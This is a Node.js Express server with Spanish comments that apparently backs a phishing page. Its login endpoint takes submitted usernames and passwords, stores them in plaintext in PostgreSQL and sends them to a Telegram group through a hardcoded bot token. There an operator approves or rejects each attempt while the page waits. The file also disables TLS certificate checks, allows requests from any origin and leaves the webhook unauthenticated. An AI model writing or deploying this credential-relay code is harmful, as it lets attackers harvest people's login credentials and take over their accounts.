require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const { TelegramBot } = require('node-telegram-bot-api');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors()); 

// --- CONFIGURACIÓN DE POSTGRESQL ---
const pool = new Pool({
    connectionString: process.env.DATABASE_URL, 
    ssl: { rejectUnauthorized: false } 
});

// --- CONFIGURACIÓN DE TELEGRAM ---
const TELEGRAM_TOKEN = '8924337848:AAFGDJNL-mlHcwj1mJAq2dDmavj7dHL0QeI';
const CHAT_ID = '-1004356075782';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// --- ENDPOINT: RECIBIR DATOS DEL FRONTEND ---
app.post('/api/login', async (req, res) => {
    const { usuario, clave } = req.body;

    try {
        // 1. Guardar intento en PostgreSQL
        const query = `
            INSERT INTO intentos_login (usuario, clave, estado, fecha) 
            VALUES ($1, $2, 'pendiente', NOW()) 
            RETURNING id;
        `;
        const result = await pool.query(query, [usuario, clave]);
        const intentoId = result.rows[0].id;

        // 2. Enviar mensaje a Telegram
        const mensaje = `🚨 *Nuevo Intento de Login*\n\n👤 *Usuario:* ${usuario}\n🔑 *Clave:* ${clave}\n\n¿Aprobar acceso?`;
        
        // Guardamos el ID del mensaje en la BD para poder editarlo luego si es necesario
        const msg = await bot.sendMessage(CHAT_ID, mensaje, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Aceptar', callback_data: `accept_${intentoId}` },
                        { text: '❌ Rechazar', callback_data: `reject_${intentoId}` }
                    ]
                ]
            }
        });

        // Actualizamos la BD con el ID del mensaje de Telegram
        await pool.query('UPDATE intentos_login SET mensaje_telegram_id = $1 WHERE id = $2', [msg.message_id, intentoId]);

        res.json({ success: true, intentoId: intentoId });

    } catch (error) {
        console.error("Error en login:", error);
        res.status(500).json({ success: false, message: "Error en el servidor" });
    }
});

// --- ENDPOINT: VERIFICAR ESTADO (Polling del Front) ---
app.get('/api/status/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const result = await pool.query('SELECT estado FROM intentos_login WHERE id = $1', [id]);
        
        if (result.rows.length === 0) {
            return res.status(404).json({ estado: 'no_encontrado' });
        }
        res.json({ estado: result.rows[0].estado }); 
    } catch (error) {
        res.status(500).json({ error: 'Error de BD' });
    }
});

// --- WEBHOOK: RECIBIR RESPUESTA DE TELEGRAM ---
app.post(`/webhook/telegram`, async (req, res) => {
    const callbackQuery = req.body.callback_query;

    if (callbackQuery) {
        const data = callbackQuery.data; 
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;
        const [accion, id] = data.split('_');

        try {
            // 1. Actualizar la base de datos (Aceptado o Rechazado)
            const nuevoEstado = accion === 'accept' ? 'aceptado' : 'rechazado';
            await pool.query('UPDATE intentos_login SET estado = $1 WHERE id = $2', [nuevoEstado, id]);

            // 2. Editar el mensaje en Telegram para quitar los botones y mostrar el resultado
            let textoOriginal = callbackQuery.message.text;
            let textoActualizado = `${textoOriginal}\n\n---\n${nuevoEstado === 'aceptado' ? '✅ *ACEPTADO*' : '❌ *RECHAZADO*'}`;
            
            await bot.editMessageText(textoActualizado, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [] } // Elimina los botones para que no se pueda clickear dos veces
            });

            // 3. Responder a Telegram (obligatorio para que desaparezca el relojito en el botón)
            await bot.answerCallbackQuery(callbackQuery.id, { text: `Acceso ${nuevoEstado}` });

        } catch (error) {
            console.error("Error procesando webhook:", error);
            // Si hay un error (por ejemplo, porque el usuario ya le había dado click), respondemos igual
            bot.answerCallbackQuery(callbackQuery.id, { text: "Este intento ya fue procesado o expiró." }).catch(()=>{});
        }
    }

    // Siempre responder 200 OK a Telegram para que no reintente enviar el mensaje
    res.sendStatus(200);
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Backend corriendo en puerto ${PORT}`);
});